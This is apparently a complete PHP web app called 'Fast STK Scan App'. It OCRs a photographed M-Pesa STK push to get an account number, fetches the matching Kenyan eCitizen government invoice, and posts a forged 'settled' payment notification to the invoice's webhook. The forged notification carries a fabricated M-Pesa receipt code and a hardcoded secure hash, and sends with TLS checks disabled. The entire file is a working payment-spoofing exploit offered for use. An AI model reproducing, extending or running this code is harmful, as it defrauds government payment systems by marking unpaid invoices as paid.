<?php
function generateMpesaCode() {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $alphabet2 = '1234567890';
    $code = '';
    $currentYear = date('Y');
    $code .= $alphabet[$currentYear - 2022 + 16];
    $currentMonth = date('n');
    $code .= $alphabet[$currentMonth - 1];
    $currentDay = date('j');
    if ($currentDay > 9) $code .= $alphabet[($currentDay - 10) % 26];
    else $code .= $currentDay;
    $code .= $alphabet2[rand(0, strlen($alphabet2) - 1)];
    while (strlen($code) < 10) $code .= $alphabet1[rand(0, strlen($alphabet1) - 1)];
    return $code;
}

// AJAX backend
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    if ($_POST['ajax_action'] === 'fetch_invoice') {
        $code = trim($_POST['code']);
        $fetch_url = "https://payments.ecitizen.go.ke/api/invoice/checkout/{$code}?callback_url=https://bomayangu.go.ke/payments";
        $invoice_html = @file_get_contents($fetch_url);
        if ($invoice_html !== false && preg_match('/<mpesa-v2\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $msisdn = $attributes['msisdn'] ?? '';
        }
        if ($invoice_html !== false && preg_match('/<airtel-v3\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $now->format(DateTime::ATOM),
                    'date_custom' => $now->format("Y-m-d H:i:sP T e")
                ]
            ]);
            exit;
        } elseif ($invoice_html !== false && preg_match('/<tkash\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $now->format(DateTime::ATOM),
                    'date_custom' => $now->format("Y-m-d H:i:sP T e")
                ]
            ]);
            exit;
        } elseif ($invoice_html !== false && preg_match('/<iframe-v3\b(.*?)\/?>/is', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\:\w+|[\w\-]+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            $jsonObj_1 = $attributes[':invoice'] ?? '';
            $obj_1 = json_decode(html_entity_decode($jsonObj_1), true);
            if (isset($obj_1['status'])) {
                echo json_encode([
                    'status' => 'success',
                    'data' => [
                        'amount' => $obj_1['amount_net'] ?? '',
                        'bill_ref' => $obj_1['client_invoice_ref'] ?? '',
                        'invoice_no' => $obj_1['invoice_number'] ?? '',
                        'notification_url1' => $obj_1['service']['metadata']['metadata']['webhook_url'] ?? '',
                        'notification_url' => 'https://app.kwspay.ecitizen.go.ke/api/payment/confirm',
                        'msisdn' => $obj_1['msisdn'] ?? '+254700000000',
                        'date_iso' => $now->format(DateTime::ATOM),
                        'date_custom' => $now->format("Y-m-d H:i:sP T e")
                    ]
                ]);
                exit;
            } else {
                echo json_encode(['status' => 'error', 'message' => 'iFrame 3 Loaded. No Object.']);
                exit;
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invoice not found.']);
            exit;
        }
    }
    if ($_POST['ajax_action'] === 'send_notification') {
        $notification_url = $_POST['notification_url'];
        $amount = $_POST['amount'];
        $bill_ref = $_POST['bill_ref'];
        $invoice_no = $_POST['invoice_no'];
        $msisdn = $_POST['msisdn'];
        $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
        $payment_date_iso = $now->format(DateTime::ATOM);
        $payment_date_custom = $now->format("Y-m-d H:i:sP T e");
        $payload = [
            "status" => "settled",
            "secure_hash" => "NTk4NGE3NTIxNjk4OTg2MjhmMWZmMzU4NmU4NDBmYmVlYWVlYTMxN2E1MWMwYzg4MTU3YTBmN2Q0NGQ3ZjUyMA==",
            "phone_number" => $msisdn,
            "payment_reference" => [[
                "payment_reference" => generateMpesaCode(),
                "payment_date" => $payment_date_iso,
                "inserted_at" => $payment_date_iso,
                "currency" => "KES",
                "amount" => $amount
            ]],
            "payment_date" => $payment_date_custom,
            "payment_channel" => "MPESA",
            "last_payment_amount" => "0",
            "invoice_number" => $invoice_no,
            "invoice_amount" => $amount . ".00",
            "currency" => "KES",
            "client_invoice_ref" => $bill_ref,
            "amount_paid" => $amount
        ];
        $ch = curl_init($notification_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $response = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        echo json_encode([
            'status' => ($http_status === 200 || $http_status === 201) ? 'success' : 'error',
            'message' => $response . '<br/> Status Code: ' . $http_status . '<br/><br/>' . json_encode($payload, JSON_PRETTY_PRINT)
        ]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fast STK Scan App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4.0.2/dist/tesseract.min.js"></script>
    <style>
        body { background: #181818; color: #fff; }
        #result { min-height: 60px; }
        .form-label, .form-control, .form-select, .alert { color: #181818 !important; }
    </style>
</head>
<body>
<div class="container py-4">
    <h4 class="mb-3 text-center">STK Push Fast Processor</h4>
    <button id="scanBtn" class="btn btn-warning mb-3 w-100">Scan STK Push (Camera)</button>
    <input type="file" accept="image/*" capture="environment" id="stkCapture" style="display:none;">
    <form id="fetchForm" class="mb-3">
        <div class="input-group">
            <input type="text" class="form-control" name="code" placeholder="Account No (auto)" required>
            <button type="submit" class="btn btn-primary">Fetch Invoice</button>
        </div>
    </form>
    <form id="notifyForm" class="mt-3 d-none">
        <div class="row">
            <div class="col-12 col-md-6 mb-2"><input type="text" class="form-control" name="notification_url" placeholder="Notification URL" readonly></div>
            <div class="col-6 mb-2"><input type="text" class="form-control" name="amount" placeholder="Amount" readonly></div>
            <div class="col-6 mb-2"><input type="text" class="form-control" name="bill_ref" placeholder="Bill Ref" readonly></div>
            <div class="col-6 mb-2"><input type="text" class="form-control" name="invoice_no" placeholder="Invoice No" readonly></div>
            <div class="col-6 mb-2"><input type="text" class="form-control" name="msisdn" placeholder="MSISDN" readonly></div>
        </div>
        <button type="submit" class="btn btn-success w-100">Submit Notification</button>
    </form>
    <div class="mt-3" id="result"></div>
</div>
<script>
let t0, t1;

// Camera scan handler
$('#scanBtn').on('click', function() { $('#stkCapture').click(); });

// On image selected
$('#stkCapture').on('change', function(e) {
    if (!e.target.files.length) return;
    let file = e.target.files[0];
    t0 = performance.now();
    $('#result').html('<div class="alert alert-info">Running OCR…</div>');
    Tesseract.recognize(
        file,
        'eng',
        { logger: m => console.log(m) }
    ).then(({ data: { text } }) => {
        // Try multiple patterns for the account no.
        let match = text.match(/Account\s*no\.?\s*([A-Z0-9]+)/i)
            || text.match(/to\s+[a-zA-Z\-\s]+no\.?\s*([A-Z0-9]{8,10})/i)
            || text.match(/\b([A-Z0-9]{8,10})\b/); // fallback
        if (match) {
            let code = match[1].trim();
            $('input[name="code"]').val(code);
            $('#fetchForm').trigger('submit');
        } else {
            $('#result').html('<div class="alert alert-danger">Account no not detected. Try retaking or crop image.</div>');
        }
    }).catch(function(err) {
        $('#result').html('<div class="alert alert-danger">OCR failed: ' + err + '</div>');
    });
});

// Invoice fetch
$('#fetchForm').on('submit', function(e) {
    e.preventDefault();
    $('#result').html('<div class="alert alert-info">Fetching invoice…</div>');
    const code = $(this).find('input[name="code"]').val();
    $.post('', { ajax_action: 'fetch_invoice', code }, function(res) {
        if (res.status === 'success') {
            Object.entries(res.data).forEach(([k, v]) => {
                $('#notifyForm').find(`[name="${k}"]`).val(v);
            });
            $('#notifyForm').removeClass('d-none');
            $('#result').html('<div class="alert alert-success">Invoice loaded. Submitting notification…</div>');
            setTimeout(() => { $('#notifyForm').trigger('submit'); }, 200); // auto-submit
        } else {
            $('#result').html(`<div class="alert alert-danger">${res.message}</div>`);
            $('#notifyForm').addClass('d-none');
        }
    }, 'json');
});

// Notification send
$('#notifyForm').on('submit', function(e) {
    e.preventDefault();
    $('#result').html('<div class="alert alert-info">Sending notification…</div>');
    const formData = $(this).serializeArray();
    const data = { ajax_action: 'send_notification' };
    formData.forEach(item => data[item.name] = item.value);
    $.post('', data, function(res) {
        t1 = performance.now();
        let elapsed = ((t1 - t0) / 1000).toFixed(3);
        $('#result').html(`<div class="alert alert-${res.status === 'success' ? 'success' : 'danger'}">
            <b>API Response:</b><br>${res.message}<br>
            <b>Elapsed time: ${elapsed}s</b>
        </div>`);
    }, 'json');
});
</script>
</body>
</html>
